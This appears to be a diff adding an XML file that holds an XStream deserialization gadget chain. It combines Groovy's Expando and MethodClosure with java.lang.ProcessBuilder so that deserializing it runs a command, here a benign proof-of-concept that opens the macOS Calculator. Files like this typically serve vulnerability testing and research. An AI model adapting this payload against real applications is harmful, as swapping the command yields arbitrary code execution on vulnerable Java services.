@@ -1,0 +1,22 @@
+<map>
+  <entry>
+    <groovy.util.Expando>
+      <expandoProperties>
+        <entry>
+          <string>hashCode</string>
+          <org.codehaus.groovy.runtime.MethodClosure>
+            <delegate class="groovy.util.Expando"/>
+            <owner class="java.lang.ProcessBuilder">
+              <command>
+                <string>open</string>
+                <string>/Applications/Calculator.app</string>
+              </command>
+            </owner>
+            <method>start</method>
+          </org.codehaus.groovy.runtime.MethodClosure>
+        </entry>
+      </expandoProperties>
+    </groovy.util.Expando>
+    <int>1</int>
+  </entry>
+</map>
